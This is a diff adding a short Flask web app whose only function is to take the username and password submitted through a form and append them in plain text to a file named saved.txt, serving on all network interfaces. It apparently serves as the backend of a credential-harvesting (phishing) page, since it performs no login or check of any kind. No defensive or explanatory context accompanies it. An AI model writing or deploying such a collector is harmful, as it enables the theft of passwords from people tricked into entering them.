@@ -1,0 +1,13 @@
+from flask import Flask, request, render_template
+app = Flask(__name__)
+
+@app.route('/', methods=['GET', 'POST'])
+def home():
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
+        with open('saved.txt', 'a') as file:
+            file.write(f"Username: {username} | Password: {password}\n")
+    return render_template('index.html')
+
+app.run(host='0.0.0.0', port=8080)
